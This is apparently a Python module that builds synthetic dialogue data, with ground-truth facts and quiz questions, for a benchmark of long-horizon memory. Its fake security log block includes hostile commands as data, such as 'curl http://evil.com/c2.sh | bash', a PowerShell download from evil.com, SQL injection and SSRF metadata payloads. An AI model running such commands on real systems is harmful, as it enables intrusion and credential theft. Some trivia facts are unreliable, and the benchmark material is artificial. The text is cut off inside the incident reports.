"""Deterministic data generation for long-horizon memory evaluation.

Philosophy:
- No LLM needed for data generation -- all content is template-based
- Reproducible: same seed produces identical dialogue every time
- Ground truth tracked for every fact delivered
- 12 information blocks test different memory challenges (including security domain)
- Scales to 5000+ turns with proportional block allocation

Public API:
    Turn: Dataclass for a single dialogue turn
    Question: Dataclass for a quiz question with expected answer
    GroundTruth: Dataclass tracking facts delivered per turn
    generate_dialogue(num_turns) -> list[Turn]
    generate_questions(ground_truth, num_questions) -> list[Question]
"""

from __future__ import annotations

import logging
import random
import time
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class Turn:
    """A single dialogue turn delivering information."""

    turn_number: int
    content: str
    block: int  # 1-12
    block_name: str
    facts: list[dict[str, str]]  # Ground truth facts delivered


@dataclass
class GradingRubric:
    """Deterministic grading rubric for a question.

    Enables hybrid deterministic + LLM grading: when a rubric is present,
    factual_accuracy and specificity can be scored via regex/string matching
    instead of calling the LLM.

    Fields:
        required_keywords: Must appear in answer (case-insensitive)
        acceptable_paraphrases: Alternative acceptable forms
        incorrect_patterns: If these appear, score 0
        dimension_weights: Override default equal weighting per dimension
    """

    required_keywords: list[str] = field(default_factory=list)
    acceptable_paraphrases: list[str] = field(default_factory=list)
    incorrect_patterns: list[str] = field(default_factory=list)
    dimension_weights: dict[str, float] = field(default_factory=dict)


@dataclass
class Question:
    """A quiz question with expected answer and scoring metadata."""

    question_id: str
    text: str
    expected_answer: str
    category: str  # needle_in_haystack, temporal_evolution, etc.
    relevant_turns: list[int]  # Which turns contain the answer
    scoring_dimensions: list[str]  # Which dimensions matter for this question
    chain_length: int = 1  # Number of hops for multi-hop questions (1 = single-hop)


@dataclass
class GroundTruth:
    """Complete ground truth for the dialogue."""

    turns: list[Turn]
    facts_by_entity: dict[str, list[dict[str, Any]]] = field(default_factory=dict)
    current_values: dict[str, Any] = field(default_factory=dict)
    superseded_values: dict[str, list[dict[str, Any]]] = field(default_factory=dict)


# ============================================================
# People data (Block 1)
# ============================================================

PEOPLE = [
    {
        "name": "Sarah Chen",
        "birthday": "March 15",
        "allergy": "shellfish",
        "hobby": "rock climbing",
        "role": "Senior Engineer",
        "team": "Platform",
        "pet": "tabby cat named Mochi",
        "hometown": "Portland, Oregon",
        "favorite_food": "pad thai",
        "degree": "MS Computer Science from Stanford",
    },
    {
        "name": "Marcus Rivera",
        "birthday": "July 22",
        "allergy": "peanuts",
        "hobby": "woodworking",
        "role": "Product Manager",
        "team": "Growth",
        "pet": "golden retriever named Duke",
        "hometown": "Austin, Texas",
        "favorite_food": "barbecue brisket",
        "degree": "MBA from Wharton",
    },
    {
        "name": "Yuki Tanaka",
        "birthday": "November 3",
        "allergy": "dairy",
        "hobby": "bonsai cultivation",
        "role": "Data Scientist",
        "team": "Analytics",
        "pet": "none",
        "hometown": "Kyoto, Japan",
        "favorite_food": "ramen",
        "degree": "PhD Statistics from MIT",
    },
    {
        "name": "Priya Patel",
        "birthday": "January 28",
        "allergy": "none",
        "hobby": "marathon running",
        "role": "DevOps Lead",
        "team": "Infrastructure",
        "pet": "two parakeets",
        "hometown": "Mumbai, India",
        "favorite_food": "masala dosa",
        "degree": "BS Computer Engineering from IIT Bombay",
    },
    {
        "name": "James O'Brien",
        "birthday": "September 9",
        "allergy": "gluten",
        "hobby": "amateur astronomy",
        "role": "Security Architect",
        "team": "Security",
        "pet": "border collie named Scout",
        "hometown": "Dublin, Ireland",
        "favorite_food": "fish and chips",
        "degree": "MS Cybersecurity from Georgia Tech",
    },
    {
        "name": "Amara Okafor",
        "birthday": "April 17",
        "allergy": "soy",
        "hobby": "oil painting",
        "role": "Frontend Lead",
        "team": "User Experience",
        "pet": "Siamese cat named Nia",
        "hometown": "Lagos, Nigeria",
        "favorite_food": "jollof rice",
        "degree": "BFA Design from RISD, self-taught programmer",
    },
    {
        "name": "Lars Eriksson",
        "birthday": "December 1",
        "allergy": "none",
        "hobby": "cross-country skiing",
        "role": "Backend Engineer",
        "team": "Platform",
        "pet": "husky named Thor",
        "hometown": "Stockholm, Sweden",
        "favorite_food": "meatballs with lingonberry",
        "degree": "MS Software Engineering from KTH",
    },
    {
        "name": "Elena Volkov",
        "birthday": "June 5",
        "allergy": "tree nuts",
        "hobby": "chess",
        "role": "QA Manager",
        "team": "Quality",
        "pet": "none",
        "hometown": "Moscow, Russia",
        "favorite_food": "borscht",
        "degree": "BS Mathematics from Moscow State",
    },
    {
        "name": "Diego Morales",
        "birthday": "August 14",
        "allergy": "none",
        "hobby": "salsa dancing",
        "role": "Mobile Engineer",
        "team": "Mobile",
        "pet": "parrot named Rio",
        "hometown": "Mexico City, Mexico",
        "favorite_food": "tacos al pastor",
        "degree": "BS Computer Science from UNAM",
    },
    {
        "name": "Fatima Al-Hassan",
        "birthday": "February 20",
        "allergy": "eggs",
        "hobby": "calligraphy",
        "role": "ML Engineer",
        "team": "AI/ML",
        "pet": "Persian cat named Layla",
        "hometown": "Cairo, Egypt",
        "favorite_food": "koshari",
        "degree": "PhD Machine Learning from Oxford",
    },
]

# ============================================================
# Project data (Block 2)
# ============================================================

PROJECTS = [
    {
        "name": "Atlas",
        "description": "Cloud migration platform",
        "original_deadline": "June 15",
        "budget": "$2.1M",
        "team_size": 12,
        "lead": "Sarah Chen",
        "updates": [
            {
                "turn_offset": 20,
                "change": "deadline",
                "old": "June 15",
                "new": "August 3",
                "reason": "vendor contract fell through",
            },
            {
                "turn_offset": 45,
                "change": "budget",
                "old": "$2.1M",
                "new": "$2.5M",
                "reason": "additional cloud credits needed",
            },
            {
                "turn_offset": 70,
                "change": "team_size",
                "old": 12,
                "new": 15,
                "reason": "hired 3 contractors for security audit",
            },
            {
                "turn_offset": 85,
                "change": "deadline",
                "old": "August 3",
                "new": "September 20",
                "reason": "compliance review took longer than expected",
            },
        ],
    },
    {
        "name": "Beacon",
        "description": "Real-time analytics dashboard",
        "original_deadline": "March 30",
        "budget": "$800K",
        "team_size": 6,
        "lead": "Marcus Rivera",
        "updates": [
            {
                "turn_offset": 15,
                "change": "team_size",
                "old": 6,
                "new": 8,
                "reason": "added 2 frontend developers",
            },
            {
                "turn_offset": 40,
                "change": "lead",
                "old": "Marcus Rivera",
                "new": "Amara Okafor",
                "reason": "Marcus moved to strategic planning",
            },
            {
                "turn_offset": 60,
                "change": "budget",
                "old": "$800K",
                "new": "$950K",
                "reason": "licensing costs for data visualization library",
            },
        ],
    },
    {
        "name": "Cascade",
        "description": "Automated testing framework",
        "original_deadline": "May 1",
        "budget": "$500K",
        "team_size": 4,
        "lead": "Elena Volkov",
        "updates": [
            {
                "turn_offset": 30,
                "change": "deadline",
                "old": "May 1",
                "new": "April 15",
                "reason": "ahead of schedule",
            },
            {
                "turn_offset": 55,
                "change": "team_size",
                "old": 4,
                "new": 3,
                "reason": "one member moved to Atlas",
            },
        ],
    },
    {
        "name": "Delta",
        "description": "Mobile app redesign",
        "original_deadline": "July 10",
        "budget": "$1.2M",
        "team_size": 8,
        "lead": "Diego Morales",
        "updates": [
            {
                "turn_offset": 25,
                "change": "budget",
                "old": "$1.2M",
                "new": "$1.4M",
                "reason": "need native modules for both iOS and Android",
            },
            {
                "turn_offset": 50,
                "change": "deadline",
                "old": "July 10",
                "new": "August 25",
                "reason": "iOS App Store review delayed",
            },
            {
                "turn_offset": 75,
                "change": "team_size",
                "old": 8,
                "new": 10,
                "reason": "hired QA automation specialists",
            },
        ],
    },
    {
        "name": "Echo",
        "description": "AI-powered customer support chatbot",
        "original_deadline": "September 1",
        "budget": "$1.8M",
        "team_size": 10,
        "lead": "Fatima Al-Hassan",
        "updates": [
            {
                "turn_offset": 35,
                "change": "budget",
                "old": "$1.8M",
                "new": "$2.2M",
                "reason": "GPU compute costs higher than projected",
            },
            {
                "turn_offset": 65,
                "change": "deadline",
                "old": "September 1",
                "new": "October 15",
                "reason": "model fine-tuning required additional iterations",
            },
            {
                "turn_offset": 80,
                "change": "lead",
                "old": "Fatima Al-Hassan",
                "new": "Yuki Tanaka",
                "reason": "Fatima moved to research division",
            },
        ],
    },
]

# ============================================================
# Technical facts (Block 3)
# ============================================================

TECHNICAL_DOMAINS = {
    "programming": [
        "Python 3.12 introduced the new 'type' statement for type aliases.",
        "Rust's borrow checker prevents data races at compile time.",
        "Go 1.22 added the 'range over integers' feature.",
        "TypeScript 5.4 added the 'NoInfer' utility type.",
        "Java 21 introduced virtual threads for lightweight concurrency.",
        "C# 12 added primary constructors for all classes.",
        "Swift 5.9 added macro support.",
        "Kotlin 2.0 introduced the K2 compiler.",
        "Zig 0.12 aims to be a better C replacement.",
        "Julia 1.10 improved garbage collection performance by 30%.",
        "Elixir 1.16 added built-in code formatting for HEEx templates.",
        "Haskell's GHC 9.8 improved error messages significantly.",
        "OCaml 5.1 added native multicore support.",
        "Gleam 1.0 reached stable release in March 2024.",
        "Nim 2.0 introduced ARC memory management.",
        "Scala 3 replaced implicits with given/using clauses.",
        "PHP 8.3 added typed class constants.",
        "Ruby 3.3 introduced RJIT, a pure Ruby JIT compiler.",
        "Dart 3.3 added extension types for zero-cost wrappers.",
    ],
    "security": [
        "OWASP Top 10 2021 lists 'Broken Access Control' as the #1 risk.",
        "Zero Trust Architecture requires 'never trust, always verify'.",
        "The SolarWinds attack compromised 18,000 organizations in 2020.",
        "Post-quantum cryptography standard CRYSTALS-Kyber was selected by NIST.",
        "Supply chain attacks increased 742% between 2019 and 2022.",
        "Passkeys replace passwords using FIDO2/WebAuthn standards.",
        "The Log4Shell vulnerability (CVE-2021-44228) had a CVSS score of 10.0.",
        "Hardware security keys provide the strongest form of 2FA.",
        "Memory-safe languages prevent 70% of security vulnerabilities.",
        "Confidential computing protects data while it's being processed.",
    ],
    "databases": [
        "PostgreSQL 16 improved parallel query performance by 40%.",
        "Redis 7.2 introduced triggers and functions.",
        "MongoDB 7.0 added queryable encryption.",
        "DuckDB is an in-process OLAP database inspired by SQLite.",
        "CockroachDB provides serializable isolation by default.",
        "TimescaleDB handles time-series data at 10-100x the speed of PostgreSQL.",
        "SurrealDB combines document, graph, and relational models.",
        "ClickHouse processes billions of rows per second for analytics.",
        "SQLite is the most deployed database engine in the world.",
        "Kuzu is a graph database optimized for analytics workloads.",
    ],
    "cloud": [
        "AWS Lambda cold starts average 200-500ms for Python.",
        "Google Cloud Run scales to zero when there's no traffic.",
        "Azure Container Apps supports Dapr for microservice communication.",
        "Cloudflare Workers execute at the edge in under 5ms.",
        "Fly.io deploys containers to servers closest to users.",
        "Railway simplifies deployment with automatic Nixpacks detection.",
        "Vercel's Edge Network has 40+ global points of presence.",
        "DigitalOcean App Platform supports auto-scaling.",
        "Render provides free static site hosting with CI/CD.",
        "Heroku removed its free tier in November 2022.",
    ],
    "ml_ai": [
        "GPT-4 was trained on approximately 1.8 trillion parameters.",
        "Retrieval-Augmented Generation (RAG) reduces hallucinations.",
        "Fine-tuning a 7B parameter model requires about 16GB VRAM.",
        "RLHF aligns language models with human preferences.",
        "Mixture of Experts (MoE) activates only a subset of parameters per token.",
        "LoRA reduces fine-tuning parameters by 10,000x.",
        "Constitutional AI trains models using a set of principles.",
        "Diffusion models generate images by iteratively denoising random noise.",
        "Vector databases like Pinecone store and search high-dimensional embeddings.",
        "GGUF format enables running large models on consumer hardware.",
    ],
    "devops": [
        "Kubernetes 1.29 introduced Sidecar Containers as a built-in feature.",
        "Terraform 1.6 added 'testing' framework for infrastructure modules.",
        "Docker BuildKit reduces image build times by 50-80%.",
        "Argo CD implements GitOps for Kubernetes declaratively.",
        "Prometheus uses a pull-based model for metrics collection.",
        "OpenTelemetry unifies tracing, metrics, and logging.",
        "Nix provides reproducible builds across all platforms.",
        "Podman is a daemonless container runtime alternative to Docker.",
        "Cilium uses eBPF for container networking at kernel level.",
        "Crossplane enables managing cloud resources via Kubernetes CRDs.",
    ],
    "architecture": [
        "Event sourcing stores state changes as a sequence of events.",
        "CQRS separates read and write models for better scalability.",
        "Domain-Driven Design focuses on ubiquitous language.",
        "Hexagonal architecture isolates business logic from infrastructure.",
        "Saga pattern manages distributed transactions across microservices.",
        "Circuit breaker pattern prevents cascading failures.",
        "Sidecar pattern extends container functionality without code changes.",
        "Strangler fig pattern enables incremental legacy system migration.",
        "Outbox pattern ensures reliable event publishing from databases.",
        "Choreography-based orchestration reduces single points of failure.",
    ],
    "frontend": [
        "React Server Components reduce client-side JavaScript by 30-50%.",
        "Signals (SolidJS, Angular, Preact) are replacing virtual DOM diffing.",
        "Astro generates zero JavaScript by default for static content.",
        "htmx enables modern UI patterns without heavy JavaScript.",
        "View Transitions API enables native-like page transitions.",
        "Container queries allow responsive design based on parent, not viewport.",
        "CSS nesting is now supported natively in all major browsers.",
        "Bun aims to be an all-in-one JavaScript toolkit.",
        "Qwik uses resumability instead of hydration for instant loading.",
        "Web Components are now supported across all major browsers.",
    ],
}

# ============================================================
# Numerical data (Block 5)
# ============================================================

NUMERICAL_DATA = [
    {"entity": "Q1 revenue", "value": "$4.7M", "detail": "12% above forecast of $4.2M"},
    {
        "entity": "Q2 marketing budget",
        "value": "$2.3M",
        "detail": "15% over the original estimate of $2.0M",
    },
    {"entity": "Q3 customer acquisition cost", "value": "$127", "detail": "down from $156 in Q2"},
    {"entity": "Q4 projected revenue", "value": "$6.1M", "detail": "based on 18% growth rate"},
    {"entity": "Annual employee turnover", "value": "14.2%", "detail": "industry average is 18.5%"},
    {
        "entity": "Server uptime Q1",
        "value": "99.97%",
        "detail": "3 incidents totaling 13 minutes downtime",
    },
    {
        "entity": "Server uptime Q2",
        "value": "99.89%",
        "detail": "7 incidents totaling 47 minutes downtime",
    },
    {
        "entity": "Server uptime Q3",
        "value": "99.995%",
        "detail": "1 incident totaling 2 minutes downtime",
    },
    {
        "entity": "Server migration cost (internal audit)",
        "value": "$450K",
        "detail": "completed in 6 weeks",
    },
    {
        "entity": "Server migration cost (vendor invoice)",
        "value": "$387K",
        "detail": "excluding consulting fees",
    },
    {
        "entity": "Consulting fees for migration",
        "value": "$63K",
        "detail": "billed separately by Accenture",
    },
    {
        "entity": "CI/CD pipeline speed improvement",
        "value": "40%",
        "detail": "from 12 min to 7.2 min average",
    },
    {"entity": "Test coverage", "value": "78.3%", "detail": "up from 62.1% at start of year"},
    {"entity": "API response time p95", "value": "245ms", "detail": "target is under 300ms"},
    {"entity": "API response time p99", "value": "890ms", "detail": "target is under 1000ms"},
    {
        "entity": "Database query optimization savings",
        "value": "$34K/month",
        "detail": "by reducing read replicas from 5 to 3",
    },
    {"entity": "Monthly AWS bill", "value": "$127K", "detail": "up 8% from last month"},
    {"entity": "Open bug count", "value": "342", "detail": "123 critical, 219 non-critical"},
    {
        "entity": "Sprint velocity",
        "value": "47 points",
        "detail": "team average over last 6 sprints",
    },
    {"entity": "NPS score", "value": "72", "detail": "up from 65 last quarter"},
    {"entity": "Customer retention rate", "value": "94.3%", "detail": "target is 95%"},
    {
        "entity": "Code review turnaround",
        "value": "4.2 hours",
        "detail": "median time to first review",
    },
    {
        "entity": "Deployment frequency",
        "value": "8.3 per week",
        "detail": "up from 3.1 per week last quarter",
    },
    {"entity": "Mean time to recovery", "value": "23 minutes", "detail": "down from 45 minutes"},
    {
        "entity": "Infrastructure cost per user",
        "value": "$0.42",
        "detail": "at 285K monthly active users",
    },
    {
        "entity": "Total monthly active users",
        "value": "285,000",
        "detail": "growing 12% month over month",
    },
    {
        "entity": "Premium subscription conversion",
        "value": "7.8%",
        "detail": "from free trial to paid",
    },
    {
        "entity": "Average session duration",
        "value": "14.3 minutes",
        "detail": "mobile: 8.2, desktop: 22.1",
    },
    {
        "entity": "Feature request backlog",
        "value": "892 items",
        "detail": "387 from enterprise customers",
    },
    {
        "entity": "Security audit findings",
        "value": "17 issues",
        "detail": "3 critical, 5 high, 9 medium",
    },
]

# ============================================================
# Contradictory sources (Block 6)
# ============================================================

CONTRADICTORY_REPORTS = [
    {
        "topic": "Q3 revenue",
        "sources": [
            {"name": "Finance Department", "claim": "$5.2M", "detail": "includes deferred revenue"},
            {
                "name": "External Auditor",
                "claim": "$4.8M",
                "detail": "excludes deferred revenue recognition",
            },
            {
                "name": "Board Presentation",
                "claim": "$5.0M",
                "detail": "rounded figure from preliminary report",
            },
        ],
    },
    {
        "topic": "competitor market share",
        "sources": [
            {
                "name": "Gartner Report",
                "claim": "23%",
                "detail": "based on enterprise segment only",
            },
            {"name": "Internal Research", "claim": "31%", "detail": "includes SMB and enterprise"},
            {
                "name": "Industry Newsletter",
                "claim": "18%",
                "detail": "based on revenue, not customers",
            },
        ],
    },
    {
        "topic": "user satisfaction score",
        "sources": [
            {
                "name": "Customer Success Team",
                "claim": "4.5 out of 5",
                "detail": "from post-support surveys",
            },
            {
                "name": "Annual Survey",
                "claim": "3.8 out of 5",
                "detail": "random sample of all users",
            },
            {
                "name": "App Store Reviews",
                "claim": "4.2 out of 5",
                "detail": "average across iOS and Android",
            },
        ],
    },
    {
        "topic": "engineering headcount",
        "sources": [
            {"name": "HR Department", "claim": "187 engineers", "detail": "full-time only"},
            {
                "name": "Engineering VP",
                "claim": "214 engineers",
                "detail": "includes 27 contractors",
            },
            {
                "name": "LinkedIn Profile",
                "claim": "203 engineers",
                "detail": "self-reported, may include interns",
            },
        ],
    },
    {
        "topic": "data center energy usage",
        "sources": [
            {"name": "Facilities Team", "claim": "2.4 MW average", "detail": "measured at meter"},
            {
                "name": "Cloud Provider Report",
                "claim": "1.8 MW equivalent",
                "detail": "shared infrastructure allocation",
            },
            {
                "name": "Sustainability Report",
                "claim": "3.1 MW total",
                "detail": "includes cooling and networking",
            },
        ],
    },
    {
        "topic": "product launch date",
        "sources": [
            {"name": "PM Roadmap", "claim": "March 15", "detail": "original timeline"},
            {
                "name": "Engineering Lead",
                "claim": "April 2",
                "detail": "accounting for testing buffer",
            },
            {
                "name": "Marketing Team",
                "claim": "March 22",
                "detail": "aligned with conference schedule",
            },
        ],
    },
    {
        "topic": "support ticket volume trend",
        "sources": [
            {
                "name": "Support Dashboard",
                "claim": "declining 5% month-over-month",
                "detail": "since new docs launched",
            },
            {
                "name": "CTO Report",
                "claim": "flat",
                "detail": "total volume same, complexity increasing",
            },
            {
                "name": "Customer Advisory Board",
                "claim": "increasing",
                "detail": "enterprise customers report more issues",
            },
        ],
    },
    {
        "topic": "database migration risk level",
        "sources": [
            {
                "name": "DBA Team",
                "claim": "low risk",
                "detail": "schema compatible, tested in staging",
            },
            {
                "name": "Security Review",
                "claim": "medium risk",
                "detail": "PII handling during migration window",
            },
            {
                "name": "External Consultant",
                "claim": "high risk",
                "detail": "similar migrations failed at 3 other companies",
            },
        ],
    },
]

# ============================================================
# Distractor templates (Block 8)
# ============================================================

DISTRACTOR_TOPICS = [
    "The weather in Bermuda averages 75 degrees Fahrenheit in winter.",
    "Ancient Egyptians used papyrus for writing around 3000 BC.",
    "The speed of light is approximately 299,792,458 meters per second.",
    "Coffee was first discovered in Ethiopia in the 9th century.",
    "The Amazon River is the second longest river in the world.",
    "Honey never spoils and has been found preserved in ancient tombs.",
    "The Eiffel Tower grows about 6 inches taller in summer due to heat expansion.",
    "Octopuses have three hearts and blue blood.",
    "The Great Wall of China is not visible from space with the naked eye.",
    "Bananas are technically berries, but strawberries are not.",
    "The shortest war in history lasted 38 minutes between Britain and Zanzibar.",
    "A group of flamingos is called a flamboyance.",
    "Venus rotates backwards compared to most other planets.",
    "The first computer bug was an actual moth found in a relay.",
    "Sharks have been around longer than trees.",
    "The inventor of the Pringles can is buried in one.",
    "A day on Venus is longer than a year on Venus.",
    "Wombat poop is cube-shaped.",
    "Scotland's national animal is the unicorn.",
    "The Twitter bird's official name was Larry.",
    "Cleopatra lived closer in time to the Moon landing than to the building of the pyramids.",
    "More people are killed by vending machines each year than by sharks.",
    "A jiffy is an actual unit of time: 1/100th of a second.",
    "The dot over the letters i and j is called a tittle.",
    "The hashtag symbol is technically called an octothorpe.",
    "Astronauts can grow up to 2 inches taller in space.",
    "The plastic tips on shoelaces are called aglets.",
    "A bolt of lightning is five times hotter than the surface of the sun.",
    "Cows have best friends and get stressed when separated.",
    "The total weight of ants on Earth roughly equals the weight of all humans.",
]


# ============================================================
# Security logs (Block 9)
# ============================================================

SECURITY_EVENTS = [
    {"timestamp": "2024-03-15 14:23:01", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "admin", "severity": "medium"},
    {"timestamp": "2024-03-15 14:23:05", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "root", "severity": "high"},
    {"timestamp": "2024-03-15 14:23:08", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "admin", "severity": "medium"},
    {"timestamp": "2024-03-15 14:23:12", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "root", "severity": "high"},
    {"timestamp": "2024-03-15 14:23:15", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "admin", "severity": "medium"},
    {"timestamp": "2024-03-15 14:23:18", "source_ip": "192.168.1.45", "event": "Failed SSH login", "user": "root", "severity": "high"},
    {"timestamp": "2024-03-15 14:23:22", "source_ip": "192.168.1.45", "event": "Successful SSH login", "user": "admin", "severity": "critical"},
    {"timestamp": "2024-03-15 14:30:00", "source_ip": "192.168.1.45", "event": "Privilege escalation attempt", "user": "admin", "severity": "critical"},
    {"timestamp": "2024-03-15 15:00:00", "source_ip": "10.0.0.50", "event": "Port scan detected", "user": "N/A", "severity": "high", "ports_scanned": "22,80,443,3306,5432,8080,8443"},
    {"timestamp": "2024-03-15 15:05:00", "source_ip": "10.0.0.50", "event": "SQL injection attempt", "user": "N/A", "severity": "critical", "target": "/api/v1/users?id=1 OR 1=1"},
    {"timestamp": "2024-03-15 15:10:00", "source_ip": "10.0.0.50", "event": "WAF blocked request", "user": "N/A", "severity": "medium", "rule": "OWASP-CRS-942100"},
    {"timestamp": "2024-03-16 02:00:00", "source_ip": "172.16.0.100", "event": "Large data transfer", "user": "svc_backup", "severity": "high", "bytes_transferred": "2.3GB", "destination": "external_ip:185.220.101.45"},
    {"timestamp": "2024-03-16 02:15:00", "source_ip": "172.16.0.100", "event": "Anomalous DNS query", "user": "svc_backup", "severity": "high", "query": "data.exfil.evil.com"},
    {"timestamp": "2024-03-16 02:20:00", "source_ip": "172.16.0.100", "event": "Connection to known C2 server", "user": "svc_backup", "severity": "critical", "c2_ip": "185.220.101.45"},
    {"timestamp": "2024-03-16 08:00:00", "source_ip": "10.0.1.25", "event": "Failed MFA challenge", "user": "jsmith", "severity": "medium"},
    {"timestamp": "2024-03-16 08:01:00", "source_ip": "10.0.1.25", "event": "Failed MFA challenge", "user": "jsmith", "severity": "medium"},
    {"timestamp": "2024-03-16 08:02:00", "source_ip": "10.0.1.25", "event": "Account locked", "user": "jsmith", "severity": "high"},
    {"timestamp": "2024-03-16 09:00:00", "source_ip": "192.168.2.10", "event": "Firewall rule change", "user": "netadmin", "severity": "medium", "rule": "Allow 0.0.0.0/0 to port 3389"},
    {"timestamp": "2024-03-16 09:05:00", "source_ip": "192.168.2.10", "event": "RDP brute force detected", "user": "N/A", "severity": "critical", "attempts": 150},
    {"timestamp": "2024-03-16 10:00:00", "source_ip": "10.0.0.5", "event": "Malware signature detected", "user": "N/A", "severity": "critical", "malware": "Cobalt Strike beacon", "file": "/tmp/.hidden/payload.exe"},
    {"timestamp": "2024-03-16 10:05:00", "source_ip": "10.0.0.5", "event": "Lateral movement detected", "user": "SYSTEM", "severity": "critical", "technique": "PsExec", "target": "10.0.0.6,10.0.0.7"},
    {"timestamp": "2024-03-16 11:00:00", "source_ip": "10.0.3.15", "event": "Certificate expiry warning", "user": "N/A", "severity": "low", "cert": "*.internal.corp", "days_remaining": 7},
    {"timestamp": "2024-03-16 12:00:00", "source_ip": "10.0.0.8", "event": "Unauthorized API access", "user": "api_guest", "severity": "high", "endpoint": "/admin/config"},
    {"timestamp": "2024-03-16 13:00:00", "source_ip": "10.0.0.9", "event": "Suspicious PowerShell execution", "user": "workstation\\user1", "severity": "high", "command": "Invoke-WebRequest -Uri http://evil.com/shell.ps1"},
    {"timestamp": "2024-03-16 14:00:00", "source_ip": "10.0.0.10", "event": "Database dump detected", "user": "db_readonly", "severity": "critical", "tables": "users,credentials,api_keys"},
    {"timestamp": "2024-03-17 00:00:00", "source_ip": "10.0.0.11", "event": "Crypto mining process detected", "user": "N/A", "severity": "high", "process": "xmrig", "cpu_usage": "95%"},
    {"timestamp": "2024-03-17 06:00:00", "source_ip": "10.0.4.1", "event": "VPN connection from unusual country", "user": "cjohnson", "severity": "medium", "country": "North Korea"},
    {"timestamp": "2024-03-17 08:00:00", "source_ip": "10.0.0.12", "event": "File integrity violation", "user": "N/A", "severity": "high", "file": "/etc/passwd", "change": "new user added: backdoor"},
    {"timestamp": "2024-03-17 09:00:00", "source_ip": "10.0.0.13", "event": "SIEM correlation alert", "user": "N/A", "severity": "critical", "rule": "APT-CHAIN-001", "related_events": "brute_force,lateral_movement,data_exfil"},
    {"timestamp": "2024-03-17 10:00:00", "source_ip": "10.0.5.1", "event": "Phishing email detected", "user": "hr_inbox", "severity": "high", "subject": "Urgent: Update your credentials", "sender": "support@1egit-company.com"},
    {"timestamp": "2024-03-17 11:00:00", "source_ip": "10.0.0.14", "event": "Container escape attempt", "user": "N/A", "severity": "critical", "container": "web-app-prod-3", "technique": "CVE-2024-21626"},
    {"timestamp": "2024-03-17 12:00:00", "source_ip": "10.0.0.15", "event": "AWS key exposure", "user": "developer1", "severity": "critical", "key_type": "AKIA*", "found_in": "public GitHub repo"},
    {"timestamp": "2024-03-17 13:00:00", "source_ip": "10.0.6.1", "event": "DDoS attack detected", "user": "N/A", "severity": "high", "type": "SYN flood", "pps": "500K", "target": "api-gateway"},
    {"timestamp": "2024-03-17 14:00:00", "source_ip": "10.0.0.16", "event": "Insider threat indicator", "user": "disgruntled_emp", "severity": "high", "activity": "bulk download of sensitive docs"},
    {"timestamp": "2024-03-17 15:00:00", "source_ip": "10.0.7.1", "event": "DNS tunneling detected", "user": "N/A", "severity": "high", "domain": "*.tunnel.attacker.net", "data_rate": "50KB/s"},
    {"timestamp": "2024-03-17 16:00:00", "source_ip": "10.0.0.17", "event": "Successful exploitation", "user": "N/A", "severity": "critical", "vulnerability": "CVE-2024-3094", "target_service": "xz-utils/sshd"},
    {"timestamp": "2024-03-17 17:00:00", "source_ip": "10.0.0.18", "event": "Anomalous cron job created", "user": "www-data", "severity": "high", "command": "curl http://evil.com/c2.sh | bash"},
    {"timestamp": "2024-03-17 18:00:00", "source_ip": "10.0.8.1", "event": "Security group modification", "user": "iam_admin", "severity": "medium", "change": "SSH opened to 0.0.0.0/0"},
    {"timestamp": "2024-03-17 19:00:00", "source_ip": "10.0.0.19", "event": "Ransomware behavior detected", "user": "SYSTEM", "severity": "critical", "indicator": "mass file encryption (.locked extension)"},
    {"timestamp": "2024-03-17 20:00:00", "source_ip": "10.0.0.20", "event": "Supply chain compromise", "user": "N/A", "severity": "critical", "package": "event-stream@5.0.0", "type": "malicious dependency"},
    {"timestamp": "2024-03-18 00:00:00", "source_ip": "10.0.0.21", "event": "Kerberoasting detected", "user": "N/A", "severity": "high", "target_spn": "MSSQLSvc/db01.corp:1433"},
    {"timestamp": "2024-03-18 01:00:00", "source_ip": "10.0.0.22", "event": "Golden ticket usage", "user": "krbtgt", "severity": "critical", "domain": "corp.internal"},
    {"timestamp": "2024-03-18 02:00:00", "source_ip": "10.0.0.23", "event": "CloudTrail logging disabled", "user": "rogue_admin", "severity": "critical", "account": "prod-account-123"},
    {"timestamp": "2024-03-18 03:00:00", "source_ip": "10.0.9.1", "event": "WAF bypass detected", "user": "N/A", "severity": "high", "technique": "Unicode normalization", "payload": "%u0027 OR 1=1"},
    {"timestamp": "2024-03-18 04:00:00", "source_ip": "10.0.0.24", "event": "Secrets manager access spike", "user": "lambda_func", "severity": "high", "secrets_accessed": 47, "normal_avg": 3},
    {"timestamp": "2024-03-18 05:00:00", "source_ip": "10.0.0.25", "event": "TLS downgrade attempt", "user": "N/A", "severity": "medium", "from_version": "TLS 1.3", "to_version": "TLS 1.0"},
    {"timestamp": "2024-03-18 06:00:00", "source_ip": "10.0.10.1", "event": "Zero-day exploit attempt", "user": "N/A", "severity": "critical", "target": "Exchange Server", "cve": "CVE-2024-XXXX"},
    {"timestamp": "2024-03-18 07:00:00", "source_ip": "10.0.0.26", "event": "Service account password spray", "user": "N/A", "severity": "high", "accounts_targeted": 200, "password_used": "Summer2024!"},
    {"timestamp": "2024-03-18 08:00:00", "source_ip": "10.0.0.27", "event": "Unauthorized S3 bucket access", "user": "external", "severity": "critical", "bucket": "prod-customer-data", "action": "GetObject"},
    {"timestamp": "2024-03-18 09:00:00", "source_ip": "10.0.0.28", "event": "SSRF vulnerability exploited", "user": "N/A", "severity": "critical", "internal_target": "http://169.254.169.254/latest/meta-data/iam/"},
]

# ============================================================
# Incident reports (Block 10)
# ============================================================

INCIDENTS = [
    {
        "id": "INC-2024-001",
        "title": "Ransomware attempt on file server",
        "status": "contained",
        "severity": "critical",
        "affected_systems": ["FS-01", "FS-02", "BACKUP-01"],
        "iocs": ["185.220.101.45", "evil.com", "payload.exe", "Cobalt Strike"],
        "cves": ["CVE-2024-21626"],
        "timeline": [
            {"time": "2024-03-17 19:00", "action": "Ransomware behavior detected on FS-01"},
            {"time": "2024-03-17 19:15", "action": "Incident declared, SOC notified"},
            {"time": "2024-03-17 19:30", "action": "FS-01 isolated from network"},
            {"time": "2024-03-17 20:00", "action": "FS-02 found encrypted, isolated"},
            {"time": "2024-03-17 21:00", "action": "BACKUP-01 verified clean"},
            {"time": "2024-03-17 22:00", "action": "Containment confirmed, no further spread"},
        ],
        "updates": [
